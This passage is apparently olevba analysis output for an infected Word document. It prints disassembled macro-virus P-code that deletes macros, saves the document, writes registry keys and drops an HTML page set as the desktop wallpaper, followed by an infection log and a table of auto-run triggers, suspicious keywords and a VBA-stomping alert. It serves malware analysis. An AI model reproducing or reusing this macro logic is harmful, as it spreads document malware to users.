' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #69:
' 	StartForVariable 
' 	Next 
' Line #70:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Return 
' Line #74:
' 	Label LoggingIn 
' Line #75:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #76:
' 	GoSub ShowMe 
' Line #77:
' 	Return 
' Line #78:
' 	Label ShowMe 
' Line #79:
' 	Dim 
' 	VarDefn RootsyS (As String)
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St RootsyS 
' Line #82:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\Jon.html"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007A "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006C "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0080 "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "<font normal></center>To the very best that happen in mylife<p>"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0048 "<p>Long ago and in my mind, I can see your face lonely and lost in time "
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "<p>You were gone since yester month But the memories, never would dissapear"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "<p>I think of you, I THINK OF YOU.<p>"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0059 "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0055 "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "<p>Long ago so faraway. But the light of blue, still living with me today."
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004D "<p>You were gone since yester month.  But the memories never would dissapear."
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0063 "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #98:
' 	Ld RootsyS 
' 	LitStr 0x0009 "\Jon.html"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0046 "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #99:
' 	Return 
' Line #100:
' 	EndSub 
' Line #101:
' 	QuoteRem 0x0000 0x000B "Logfile -->"
' Line #102:
' Line #103:
' Line #104:
' 	QuoteRem 0x0000 0x0025 " 06:14:2518:14:25 -Kamis, 22 Jul 1999"
' Line #105:
' 	QuoteRem 0x0000 0x000D " Jon MMx 2000"
' Line #106:
' 	QuoteRem 0x0000 0x0016 " jonthebest@hotbot.com"
' Line #107:
' Line #108:
' 	QuoteRem 0x0000 0x0024 " 03:57:4015:57:40 -Senin, 5 Jun 2017"
' Line #109:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #110:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x0023 " 04:03:316:03:03 -Senin, 5 Jun 2017"
' Line #116:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #117:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x0025 " 01:05:1613:05:16 -Selasa, 6 Jun 2017"
' Line #123:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #124:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' 	QuoteRem 0x0000 0x0024 " 11:05:2511:05:25 -Kamis, 8 Jun 2017"
' Line #131:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #132:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' 	QuoteRem 0x0000 0x0026 " 10:23:2722:23:27 -Minggu, 13 Des 1998"
' Line #138:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #139:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' 	QuoteRem 0x0000 0x002D " 08:53:518:53:51 PM PM-Wednesday, 28 Jul 1999"
' Line #145:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #146:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x002B " 08:47:268:47:26 AM AM-Saturday, 7 Aug 1999"
' Line #152:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #153:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' 	QuoteRem 0x0000 0x002A " 06:49:56:49:05 PM PM-Tuesday, 10 Aug 1999"
' Line #159:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #160:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' 	QuoteRem 0x0000 0x0026 " 07:52:337:52:33 -Kamis, 12 Agust 1999"
' Line #166:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #167:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' 	QuoteRem 0x0000 0x0029 " 08:08:68:08:06 AM AM-Monday, 23 Aug 1999"
' Line #173:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #174:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' 	QuoteRem 0x0000 0x0028 " 07:48:37:48:03  SIANG-Kamis, 2 Sep 1999"
' Line #180:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #181:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' 	QuoteRem 0x0000 0x002B " 11:26:1423:26:14  MALAM-Jumat, 10 Sep 1999"
' Line #187:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #188:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' 	QuoteRem 0x0000 0x002C " 10:04:1010:04:10 AM AM-Saturday, 2 Oct 1999"
' Line #194:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #195:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x002C " 08:29:228:29:22 PM PM-Thursday, 28 Oct 1999"
' Line #201:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #202:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0029 " 06:18:66:18:06 AM AM-Friday, 29 Oct 1999"
' Line #208:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #209:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' 	QuoteRem 0x0000 0x002D " 12:29:512:29:05 PM PM-Wednesday, 15 Dec 1999"
' Line #215:
' 	QuoteRem 0x0000 0x000C " JonMMx 2000"
' Line #216:
' 	QuoteRem 0x0000 0x0015 " JonMMx2000@yahoo.com"
' Line #217:
' Line #218:
' Line #219:
' Line #220:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |scanreg.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

